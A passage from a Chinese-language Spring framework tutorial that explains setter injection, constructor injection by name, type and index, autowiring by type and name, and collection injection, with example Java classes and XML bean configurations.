标签</mark></p><ul><li>基本类型注入</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>bean <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"com.itheima.dao.impl.BookDaoImp"</span> id<span class="token operator">=</span><span class="token string">"bookDao"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>property name<span class="token operator">=</span><span class="token string">"databaseName"</span> value<span class="token operator">=</span><span class="token string">"mysql"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>property name<span class="token operator">=</span><span class="token string">"connectionNum"</span> value<span class="token operator">=</span><span class="token string">"22"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>bean<span class="token operator">></span>    需要类里有setter方法<span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImp</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> connectionNum<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> databaseName<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ....."</span> <span class="token operator">+</span> <span class="token string">"\ndatabaseName:"</span> <span class="token operator">+</span>databaseName <span class="token operator">+</span> <span class="token string">"\nconnectionNum:"</span> <span class="token operator">+</span>connectionNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setConnectionNum</span><span class="token punctuation">(</span><span class="token keyword">int</span> connectionNum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>connectionNum <span class="token operator">=</span> connectionNum<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDatabaseName</span><span class="token punctuation">(</span><span class="token class-name">String</span> databaseName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>databaseName <span class="token operator">=</span> databaseName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="113-构造器注入引用类型"><a class="markdownIt-Anchor" href="#113-构造器注入引用类型">#</a> 11.3 构造器注入 —— 引用类型</h2><p><mark>使用 constructor-arg 标签</mark></p><ul><li>构造器注入引用类型对象</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dao book<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.UserDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.service.impl.BookServiceImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>注意这里的name指的是构造方法里的形参名，ref指的是前面bean给的ID名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">UserDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">BookService</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">UserDao</span> userDao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        userDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">BookServiceImpl</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span> bookDao<span class="token punctuation">,</span> <span class="token class-name">UserDao</span> userDao<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>bookDao <span class="token operator">=</span> bookDao<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>userDao <span class="token operator">=</span> userDao<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="114-构造器注入简单类型"><a class="markdownIt-Anchor" href="#114-构造器注入简单类型">#</a> 11.4 构造器注入 —— 简单类型</h2><p><mark>使用 constructor-arg 标签</mark></p><ul><li>构造器注入简单类型对象</li><li>这种方式因为配置文件里需要写构造方法的参数名，耦合度还是很高</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dao book<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>databaseName<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mysql<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>connectionCount<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>注意写的时候要注意写的顺序必须和构造方法参数的位置一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> databaseName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> connectionCount<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ......"</span> <span class="token operator">+</span> databaseName <span class="token operator">+</span> <span class="token string">","</span> <span class="token operator">+</span> connectionCount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">BookDaoImpl</span><span class="token punctuation">(</span><span class="token class-name">String</span> databaseName<span class="token punctuation">,</span> <span class="token keyword">int</span> connectionCount<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>databaseName <span class="token operator">=</span> databaseName<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>connectionCount <span class="token operator">=</span> connectionCount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>解耦合 1：使用 type<ul><li>解决形参名称问题</li><li>这种方法在<mark>有两个或以上同类型的参数</mark>时不能使用</li></ul></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dao book<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mysql<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>解耦合 2：使用 index<ul><li>使用位置解决参数类型重复问题</li></ul></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dao book<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mysql<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="115-依赖注入方式选择"><a class="markdownIt-Anchor" href="#115-依赖注入方式选择">#</a> 11.5 依赖注入方式选择</h2><ol><li>强制依赖使用构造器进行，使用 setter 注入有概率不进行注入导致 null 对象出现</li><li>可选依赖使用 setter 注入进行，灵活性强</li><li>Spring 框架倡导使用<mark>构造器</mark>，第三方框架内部大多数采用构造器注入的形式进行数据初始化，相对严谨</li><li>如果有必要可以两者同时使用，使用构造器注入完成强制依赖注入，使用 setter 注入完成可选依赖的注入</li><li>实际开发过程中还要根据实际情况分析，如果受控对象没有提供 setter 方法就必须使用构造器注入</li><li><mark>自己开发的模块推荐使用 setter 注入</mark></li></ol><h1 id="12-依赖自动装配"><a class="markdownIt-Anchor" href="#12-依赖自动装配">#</a> 12、依赖自动装配</h1><ul><li>IoC 容器根据 bean 所依赖的资源在容器中自动查找并注入到 bean 中的过程称为自动装配</li><li>自动装配方式<ul><li>按类型（常用）</li><li>按名称</li><li>按构造方法</li><li>不启用自动装配</li></ul></li></ul><h2 id="121-按类型自动装配"><a class="markdownIt-Anchor" href="#121-按类型自动装配">#</a> 12.1 按类型自动装配</h2><ul><li>类中的 setter 方法要保留</li><li>在 bean 标签中加一属性：audowire=“byYype”</li><li>装配时要先将类写到 bean 配置，且相同类型只能有一个 bean</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.service.impl.BookServiceImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span> <span class="token attr-name">autowire</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>byType<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">BookService</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBookDao</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span> bookDao<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>bookDao <span class="token operator">=</span> bookDao<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="122-按名称自动装配"><a class="markdownIt-Anchor" href="#122-按名称自动装配">#</a> 12.2 按名称自动装配</h2><ul><li>setter 的变量名和 bean 标签的 id 匹配</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.service.impl.BookServiceImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span> <span class="token attr-name">autowire</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>byName<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="123-依赖自动装配特征"><a class="markdownIt-Anchor" href="#123-依赖自动装配特征">#</a> 12.3 依赖自动装配特征</h2><ul><li>自动装配用于引用类型依赖注入，不能对简单类型进行操作</li><li>使用按类型装配时 (byType) 必须保障容器中相同类型的 bean 唯一，推荐使用</li><li>使用按名称装配时 (byName) 必须保障容器中具有指定名称的 bean，因变量名与配置耦合，不推荐使用</li><li>自动装配的优先级低于 setter 注入与构造器注入，同时出现时自动装配配置失败</li></ul><h1 id="13-集合注入"><a class="markdownIt-Anchor" href="#13-集合注入">#</a> 13、集合注入</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> set<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">></span></span> map<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Properties</span> properties<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>array <span class="token operator">=</span> array<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setList</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>list <span class="token operator">=</span> list<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSet</span><span class="token punctuation">(</span><span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> set<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>set <span class="token operator">=</span> set<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMap</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>map <span class="token operator">=</span> map<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setProperties</span><span class="token punctuation">(</span><span class="token class-name">Properties</span> properties<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>properties <span class="token operator">=</span> properties<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"遍历数组"</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"遍历List"</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"遍历Set"</span> <span class="token operator">+</span> set<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"遍历Map"</span> <span class="token operator">+</span> map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"遍历Properties"</span> <span class="token operator">+</span> properties<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token 